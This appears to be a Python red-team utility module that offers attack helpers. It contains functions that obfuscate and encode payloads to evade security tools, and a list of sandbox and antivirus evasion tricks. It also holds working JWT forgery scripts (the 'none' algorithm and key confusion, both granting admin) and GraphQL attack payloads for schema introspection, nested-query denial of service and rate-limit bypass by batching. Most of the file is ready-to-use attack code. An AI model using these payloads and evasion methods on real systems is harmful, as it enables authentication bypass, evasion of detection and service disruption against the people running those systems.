from typing import Dict, Any, List, Optional
import json
import base64
import re

class RedTeamUtils:
    @staticmethod
    def sanitize_payload(payload: str) -> str:
        """Sanitize a payload to avoid detection by security tools"""
        # Basic obfuscation techniques
        payload = payload.replace("powershell", "p" + "o" + "w" + "e" + "r" + "s" + "h" + "e" + "l" + "l")
        payload = payload.replace("cmd.exe", "c" + "m" + "d" + "." + "e" + "x" + "e")
        return payload
    
    @staticmethod
    def encode_payload(payload: str, encoding: str = "base64") -> str:
        """Encode a payload using various encoding techniques"""
        if encoding == "base64":
            return base64.b64encode(payload.encode()).decode()
        elif encoding == "hex":
            return payload.encode().hex()
        else:
            return payload
    
    @staticmethod
    def generate_evasion_techniques() -> List[Dict[str, Any]]:
        """Generate a list of common evasion techniques"""
        return [
            {
                "name": "String Obfuscation",
                "description": "Split strings into parts to avoid signature detection",
                "example": "cmd = 'pow' + 'ersh' + 'ell'"
            },
            {
                "name": "Base64 Encoding",
                "description": "Encode payloads in base64 to avoid string detection",
                "example": "encoded = base64.b64encode(payload.encode()).decode()"
            },
            {
                "name": "Sleep Timers",
                "description": "Add sleep timers to evade sandbox analysis",
                "example": "import time; time.sleep(10)"
            },
            {
                "name": "Environment Checks",
                "description": "Check for virtualization or analysis environments",
                "example": "import os; if os.path.exists('/proc/vz'): exit()"
            }
        ]
    
    @staticmethod
    def generate_jwt_bypass_techniques() -> List[Dict[str, str]]:
        """Generate JWT bypass techniques"""
        return [
            {
                "name": "Algorithm None Attack",
                "description": "Change the algorithm to 'none' and remove the signature",
                "code": """
import jwt

# Original token
token = "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6IkpvaG4gRG9lIiwiaWF0IjoxNTE2MjM5MDIyfQ.SflKxwRJSMeKKF2QT4fwpMeJf36POk6yJV_adQssw5c"

# Decode without verification
header_data = jwt.get_unverified_header(token)
payload_data = jwt.decode(token, options={"verify_signature": False})

# Modify payload if needed
payload_data["admin"] = True

# Create new token with 'none' algorithm
forged_token = jwt.encode(payload_data, "", algorithm="none")
print(forged_token)
"""
            },
            {
                "name": "Key Confusion Attack",
                "description": "Use the public key as the HMAC secret",
                "code": """
import jwt
import requests

# Get the public key from the server
public_key = requests.get("https://target.com/.well-known/jwks.json").json()

# Original token
token = "eyJhbGciOiJSUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6IkpvaG4gRG9lIiwiaWF0IjoxNTE2MjM5MDIyfQ.NHVaYe26MbtOYhSKkoKYdFVomg4i8ZJd8_-RU8VNbftc4TSMb4bXP3l3YlNWACwyXPGffz5aXHc6lty1Y2t4SWRqGteragsVdZufDn5BlnJl9pdR_kdVFUsra2rWKEofkZeIC4yWytE58sMIihvo9H1ScmmVwBcQP6XETqYd0aSHp1gOa9RdUPDvoXQ5oqygTqVtxaDr6wUFKrKItgBMzWIdNZ6y7O9E0DhEPTbE9rfBo6KTFsHAZnMg4k68CDp2woYIaXbmYTWcvbzIuHO7_37GT79XdIwkm95QJ7hYC9RiwrV7mesbY4PAahERJawntho0my942XheVLmGwLMBkQ"

# Decode without verification
header_data = jwt.get_unverified_header(token)
payload_data = jwt.decode(token, options={"verify_signature": False})

# Modify payload if needed
payload_data["admin"] = True

# Create new token with HS256 algorithm using public key as secret
forged_token = jwt.encode(payload_data, public_key, algorithm="HS256")
print(forged_token)
"""
            }
        ]
    
    @staticmethod
    def generate_graphql_injection_techniques() -> List[Dict[str, str]]:
        """Generate GraphQL injection techniques"""
        return [
            {
                "name": "Introspection Query",
                "description": "Query the GraphQL schema to discover all types and fields",
                "code": """
query IntrospectionQuery {
  __schema {
    queryType {
      name
    }
    mutationType {
      name
    }
    subscriptionType {
      name
    }
    types {
      ...FullType
    }
    directives {
      name
      description
      locations
      args {
        ...InputValue
      }
    }
  }
}

fragment FullType on __Type {
  kind
  name
  description
  fields(includeDeprecated: true) {
    name
    description
    args {
      ...InputValue
    }
    type {
      ...TypeRef
    }
    isDeprecated
    deprecationReason
  }
  inputFields {
    ...InputValue
  }
  interfaces {
    ...TypeRef
  }
  enumValues(includeDeprecated: true) {
    name
    description
    isDeprecated
    deprecationReason
  }
  possibleTypes {
    ...TypeRef
  }
}

fragment InputValue on __InputValue {
  name
  description
  type {
    ...TypeRef
  }
  defaultValue
}

fragment TypeRef on __Type {
  kind
  name
  ofType {
    kind
    name
    ofType {
      kind
      name
      ofType {
        kind
        name
        ofType {
          kind
          name
          ofType {
            kind
            name
            ofType {
              kind
              name
              ofType {
                kind
                name
              }
            }
          }
        }
      }
    }
  }
}
"""
            },
            {
                "name": "Nested Query DoS",
                "description": "Create deeply nested queries to cause denial of service",
                "code": """
query NestedQuery {
  user(id: 1) {
    friends {
      friends {
        friends {
          friends {
            friends {
              friends {
                friends {
                  friends {
                    friends {
                      friends {
                        name
                        email
                        id
                      }
                    }
                  }
                }
              }
            }
          }
        }
      }
    }
  }
}
"""
            },
            {
                "name": "Batching Attack",
                "description": "Send multiple queries in a single request to bypass rate limiting",
                "code": """
[
  {"query": "query { user(id: 1) { id name email } }"},
  {"query": "query { user(id: 2) { id name email } }"},
  {"query": "query { user(id: 3) { id name email } }"},
  {"query": "query { user(id: 4) { id name email } }"},
  {"query": "query { user(id: 5) { id name email } }"}
]
"""
            }
        ]